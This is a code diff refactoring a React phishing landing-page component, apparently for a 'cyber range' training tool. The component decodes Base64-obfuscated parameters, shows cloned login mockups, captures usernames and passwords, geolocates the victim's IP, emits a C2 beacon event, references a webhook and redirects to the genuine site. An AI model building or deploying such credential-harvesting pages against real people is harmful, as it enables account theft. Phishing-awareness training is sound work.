@@ -1,10 +1,12 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useCallback } from 'react';
 import { useSearchParams } from 'react-router-dom';
 import { CLONE_MOCKUPS } from '../../data/social-mockups';
 import { Monitor, Shield, AlertTriangle } from 'lucide-react';
 import { cyberRangeBus, RANGE_EVENTS } from '../../utils/cyberRangeBus';
 
 const LandingNode = () => {
+    const [sessionSeed] = useState(() => Math.floor(Math.random() * 9999));
+
     const [searchParams] = useSearchParams();
 
     // Support for Base64 obfuscated parameters
@@ -20,7 +22,7 @@ const LandingNode = () => {
             platform = params.get('p') || platform;
             targetUrl = params.get('url') || targetUrl;
             relayId = params.get('r') || relayId;
-        } catch (e) {
+        } catch {
             console.error("Failed to decode parameters");
         }
     }
@@ -47,7 +49,7 @@ const LandingNode = () => {
         return { device, browser };
     };
 
-    const onFinish = async () => {
+    const onFinish = useCallback(async () => {
         if (!captureInputs.user && !captureInputs.pass) return;
 
         setStatus('processing');
@@ -59,7 +61,7 @@ const LandingNode = () => {
             const geoRes = await fetch('https://ipapi.co/json/');
             const geoData = await geoRes.json();
             location = `${geoData.city}, ${geoData.country_name} (${geoData.ip})`;
-        } catch (e) {
+        } catch {
             console.error("Geo lookup failed");
         }
 
@@ -76,7 +78,7 @@ const LandingNode = () => {
 
         // --- CYBER RANGE EVENT BUS (Local Feedback) ---
         cyberRangeBus.emit(RANGE_EVENTS.C2_BEACON, {
-            id: `SESS-${Math.floor(Math.random() * 9999)}`,
+            id: `SESS-${sessionSeed}`,
             ip: location.split('(')[1]?.replace(')', '') || '127.0.0.1',
             os: info.device,
             user: captureInputs.user || 'victim',
@@ -134,7 +136,7 @@ const LandingNode = () => {
         setTimeout(() => {
             window.location.href = targetUrl;
         }, 1500);
-    };
+    }, [captureInputs, platform, relayId, sessionSeed, targetUrl, webhookUrl]);
 
     const mockup = CLONE_MOCKUPS[platform] || CLONE_MOCKUPS.generic;
 
